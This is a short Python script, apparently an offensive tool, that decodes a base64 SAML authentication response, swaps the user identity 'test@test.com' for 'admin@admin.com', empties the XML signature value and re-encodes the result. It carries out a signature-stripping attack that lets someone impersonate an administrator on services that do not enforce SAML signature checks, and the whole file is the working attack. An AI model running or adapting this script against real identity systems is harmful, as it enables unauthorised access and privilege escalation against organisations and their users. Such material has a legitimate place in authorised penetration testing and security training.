import argparse
import base64
import urllib.parse
import re

# Create parser
myParser = argparse.ArgumentParser(description='Stripping away signature value')

# Add arguments
myParser.add_argument('-i', action="store", dest="encoded", type=str, help="Input encoded SAML response.")

# Retrieve parsed arguments
args=myParser.parse_args()

# We first unescape characters, and then parse it to b64decode to get plaintext SAML response
decoded_SAML_res = str(base64.b64decode(urllib.parse.unquote(args.encoded)), "utf-8")

# Change the desired IDs accordingly
replace_id = decoded_SAML_res.replace("test@test.com", "admin@admin.com")

remove_sigVal = re.sub('<ds:SignatureValue>.+</ds:SignatureValue>', '<ds:SignatureValue></ds:SignatureValue>',replace_id)

encoded64 = urllib.parse.quote(base64.b64encode(bytes(remove_sigVal, 'utf-8')))

print(encoded64)
